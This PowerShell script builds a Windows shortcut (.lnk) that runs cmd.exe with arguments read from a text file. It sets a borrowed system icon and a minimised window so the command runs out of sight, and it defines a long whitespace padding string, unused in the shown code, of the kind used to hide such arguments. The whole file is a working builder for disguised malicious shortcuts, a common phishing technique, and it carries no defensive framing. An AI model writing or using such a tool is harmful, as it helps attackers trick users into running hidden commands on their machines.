$padding = '                                                                                                                                                                                                                                      '

$file = Get-Content "D:\Users\sangfor\Desktop\testlnk\test.txt"
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("D:\Users\sangfor\Desktop\testlnk\test.lnk")
$Shortcut.TargetPath = "%SystemRoot%\system32\cmd.exe"
$Shortcut.IconLocation = "%SystemRoot%\System32\Shell32.dll,21"
$Shortcut.WindowStyle = 7
$Shortcut.Arguments = $file
$Shortcut.Save()
